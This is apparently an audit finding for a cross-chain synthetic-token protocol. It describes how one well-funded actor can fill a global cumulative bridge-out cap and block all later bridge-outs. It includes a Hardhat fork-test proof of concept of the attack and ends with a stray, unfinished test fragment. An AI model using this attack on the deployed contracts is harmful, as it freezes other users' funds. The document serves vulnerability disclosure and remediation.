### Title

Global bridged-out cap allows attacker to permanently block all Synth bridge-outs - ([File: `contracts/SyntheticToken.sol`])

### Summary

`ProxyOFT.sendFrom()` lets any token holder bridge out by burning their own Synth, while `SyntheticToken._burn()` enforces one protocol-wide, cumulative `maxBridgedOutSupply` cap. [1](#0-0) [2](#0-1)  A sufficiently funded attacker can acquire or mint Synth through ordinary protocol flows, bridge out enough supply to make `bridgedOutSupply()` equal the cap, and cause every subsequent bridge-out of any nonzero amount to revert. [3](#0-2) [2](#0-1) 

### Finding Description

`ProxyOFT.sendFrom()` is a public payable entry point and forwards the caller-selected amount into `_send()`. [4](#0-3)  `_send()` invokes `_debitFrom()`, which only requires that `from_` is the sender, global bridging is active, and the destination is supported before calling `syntheticToken.burn(from_, amount_)`. [1](#0-0) 

When the authorized ProxyOFT performs the burn, `_burn()` first increases the monotonically growing `totalBridgedOut` counter and then compares the resulting net bridged-out supply with `maxBridgedOutSupply`. [2](#0-1)  `bridgedOutSupply()` is a lifetime value calculated as `max(totalBridgedOut - totalBridgedIn, 0)`, not a periodically resetting rate limit. [3](#0-2) 

Consequently, an attacker with enough Synth can call `sendFrom()` until the net bridged-out amount reaches the configured cap; after that, every additional bridge-out reverts with `SurpassMaxBridgingSupply`. [3](#0-2) [2](#0-1)  The deployed mainnet configuration gives this attack a finite target, including `40,000,000` msUSD and `4,500` msETH of net bridged-out supply. [5](#0-4) [6](#0-5) 

The only ways for capacity to return are inbound bridge mints reducing net bridged-out supply or a governor increasing the cap. [7](#0-6) [8](#0-7)  The attacker controls neither condition, but can keep their bridged position remote and can consume any future headroom again if the cap is raised.

### Impact Explanation

This is a cross-chain liveness failure: legitimate Synth holders cannot use the bridge exit path once the global cap is exhausted. [1](#0-0) [2](#0-1)  The denial applies to every user and every supported destination because the limit is global rather than per-account, per-route, or per-period. [3](#0-2) 

Because the counters are cumulative and do not decay, the freeze persists until enough inbound bridge activity reduces `totalBridgedOut - totalBridgedIn` or governance intervenes. [3](#0-2) [7](#0-6)  The attacker can therefore strand users’ Synth on the current chain for an indefinite period using only public bridge calls and their own assets.

### Likelihood Explanation

The attack is directly reachable from `ProxyOFT.sendFrom()` and requires no privileged role, malformed LayerZero endpoint behavior, oracle manipulation, or exploitation of another user’s allowance. [1](#0-0) [4](#0-3)  Its primary barrier is capital because the attacker must control enough Synth to fill the configured net bridged-out cap. [5](#0-4) [6](#0-5) 

The attacker does not destroy net value by filling the limit; `sendFrom()` burns the local Synth while creating a corresponding remote-chain claim through the OFT transfer. [9](#0-8) [10](#0-9)  Existing fork tests confirm that bridge-out increments `totalBridgedOut`, while exceeding the cap deterministically reverts. [11](#0-10) [12](#0-11) 

### Recommendation

Do not use a single cumulative global cap as the only bridge-out protection. Replace it with a rate limiter that refills over time and preferably enforce it per route or per asset with per-account and burst limits so one actor cannot permanently consume all capacity. Add monitoring for rapid utilization, alerting near the cap, and an explicit operational response before bridged-out capacity reaches the limit. If the absolute exposure cap remains necessary, treat saturation as an emergency condition and combine it with a smaller rolling-window limit rather than allowing a lifetime counter to be the sole control.

### Proof of Concept

The following Hardhat fork-style test demonstrates the condition using public issuance to fund the attacker and then public `sendFrom()` calls. It uses mainnet msETH’s configured `4,500` cap and assumes the attacker can obtain sufficient collateral.

```typescript
import {expect} from 'chai'
import {ethers} from 'hardhat'
import {parseEther} from '../helpers'
import Constants from '../helpers/constants'

describe('bridged-out cap DoS', function () {
  it('lets an attacker exhaust global msETH bridge-out capacity', async function () {
    const [attacker, victim] = await ethers.getSigners()

    // Fork fixtures provide the deployed pool, deposit token, debt token,
    // SyntheticToken, and ProxyOFT instances.
    const collateralNeeded = parseEther('9000')
    await setWethBalance(attacker.address, collateralNeeded)
    await weth.connect(attacker).approve(msdWETH_1.address, collateralNeeded)
    await msdWETH_1.connect(attacker).deposit(collateralNeeded, attacker.address)

    const cap = await msETH.maxBridgedOutSupply()
    const netOut = await msETH.bridgedOutSupply()
    const attackerAmount = cap.sub(netOut) // Exactly fills current headroom.

    // Public issuance path: attacker mints their own msETH.
    await msETHDebt_1.connect(attacker).issue(attackerAmount, attacker.address)
    expect(await msETH.balanceOf(attacker.address)).gte(attackerAmount)

    // Attacker consumes the whole protocol-wide bridge-out headroom.
    await msETHProxyOFT
      .connect(attacker)
      ['sendFrom(address,uint16,address,uint256)'](
        attacker.address,
        Constants.LZ_OP_CHAIN_ID,
        attacker.address,
        attackerAmount,
        {value: parseEther('0.5')}
      )

    expect(await msETH.bridgedOutSupply()).eq(cap)

    // Give a different user a nonzero amount through the same public issuance path.
    const victimAmount = parseEther('1')
    await setWethBalance(victim.address, collateralNeeded)
    await weth.connect(victim).approve(msdWETH_1.address, collateralNeeded)
    await msdWETH_1.connect(victim).deposit(collateralNeeded, victim.address)
    await msETHDebt_1.connect(victim).issue(victimAmount, victim.address)

    // Victim can no longer bridge out any nonzero amount.
    await expect(
      msETHProxyOFT
        .connect(victim)
        ['sendFrom(address,uint16,address,uint256)'](
          victim.address,
          Constants.LZ_OP_CHAIN_ID,
          victim.address,
          victimAmount,
          {value: parseEther('0.5')}
        )
    ).revertedWithCustomError(msETH, 'SurpassMaxBridgingSupply')
  })
})
```

The decisive calls are `sendFrom()` → `_debitFrom()` → `SyntheticToken.burn()` → `_burn()`, where `totalBridgedOut` is increased before the global cap check. [1](#0-0) [13](#0-12) [2](#0-1)

          it('should revert when the bridged-out supply cap is surpassed', async function () {
            await issueSynth(c.debt(), c.amount)
            const bridgedIn = await c.synth().totalBridgedIn()
            const bridgedOut = await c.synth().totalBridgedOut()
            const outSupplyNow = await c.synth().bridgedOutSupply()
            // Net out-supply after the burn, computed exactly as `SyntheticToken._burn` does.
